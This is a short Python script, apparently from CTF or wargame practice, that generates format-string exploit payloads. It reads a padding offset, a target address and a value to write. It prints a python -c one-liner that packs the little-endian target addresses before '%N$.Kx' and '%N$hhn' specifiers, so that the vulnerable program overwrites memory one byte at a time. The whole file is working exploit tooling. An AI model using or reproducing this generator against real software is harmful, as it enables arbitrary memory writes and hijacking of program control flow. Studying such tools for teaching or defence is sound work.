# -*- coding: utf-8 -*-

# 0xdeadbeef -> '\xef\xbe\xad\xde'
def stack_addr(addr):
	res = ''
	for i in range(len(addr),2,-2):
		res += '\\x' + addr[i-2:i]
	return res

# '14' + 5 = '19'
def strsum(pad, integer):
	return str(int(pad)+integer)

# 0x1 = 1 -> '0x00000001'
def h(integer, size=8):
	res = hex(integer)
	if len(res) < size+2:
		res = '0x' + '0'*(size-len(res)+2) + hex(integer)[2:]
	return res

# 1 octet = 8 bits = 1010 0101 = 0xa5 = [0;255]
def over(now, before, last=False):
	res = 0
#	print(now, before, last)
	if now <= before:
		# complikey
		res = (now + 0x100) - before # > 0
	else:
		# simple
		if last == True:
			res = now - before + 0x100
		else:
			res = now - before # > 0
	return res

def a(n):
	return stack_addr(h(n))

# MAIN FUNCTION
def main():
	padding = input('Padding: ') # int : 12
	addr = input('Addr to overwrite: ') # hex : 0x080485ac
	overwrite = input('Overwrite addr by: ') # hex : 0x01025544

	addr1 = int(addr,16)+0
	addr2 = int(addr,16)+1
	addr3 = int(addr,16)+2
	addr4 = int(addr,16)+3

	overwrite1 = int(overwrite[len(overwrite)-2:],16)
	overwrite2 = int(overwrite[len(overwrite)-4:len(overwrite)-2],16)
	overwrite3 = int(overwrite[len(overwrite)-6:len(overwrite)-4],16)
	overwrite4 = int(overwrite[len(overwrite)-8:len(overwrite)-6],16)

#	print(overwrite1,overwrite2,overwrite3,overwrite4)

	over1 = over(overwrite1, 16)
	over2 = over(overwrite2, overwrite1)
	over3 = over(overwrite3, overwrite2)
	over4 = over(overwrite4, overwrite3, True)

#	print(over1,over2,over3,over4)

	print('(python -c \"print ',end='')
	print('\'{}\' + \'{}\' + \'{}\' + \'{}\' + '.format(a(addr1),a(addr2),a(addr3),a(addr4)),end='')
	print('\'%{0}$.{1}x\' + \'%{0}$hhn\' + '.format(strsum(padding,0),over1), end='')
	print('\'%{0}$.{1}x\' + \'%{0}$hhn\' + '.format(strsum(padding,1),over2), end='')
	print('\'%{0}$.{1}x\' + \'%{0}$hhn\' + '.format(strsum(padding,2),over3), end='')
	print('\'%{0}$.{1}x\' + \'%{0}$hhn\''.format(strsum(padding,3),over4), end='')
	print('\")')

if __name__ == '__main__':
	main()